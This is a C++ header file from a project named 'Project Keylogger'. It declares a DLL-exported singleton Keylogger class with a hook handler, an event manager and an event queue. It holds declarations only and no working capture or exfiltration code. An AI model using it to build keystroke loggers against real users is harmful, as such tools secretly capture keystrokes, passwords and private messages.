/**
 * Project Keylogger
 */


#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H

#include "AEvent.h"
#include "EventManager.h"
#include "HookHandler.h"
#include "KeyloggerDLL.h"

class Keylogger {
public: 
	static Keylogger _instance;

public:
    Keylogger();
	~Keylogger();
    static KEYLOGGERDLL bool init();   
    static KEYLOGGERDLL void run();
    static KEYLOGGERDLL bool stop();
    static KEYLOGGERDLL bool kill();
    static KEYLOGGERDLL Keylogger& getInstance();
    bool pushToQueue(AEvent*);

private: 
    EventManager _eventManager;
    HookHandler _hookHandler;
    std::vector<AEvent*> _events;
};

#endif //_KEYLOGGER_H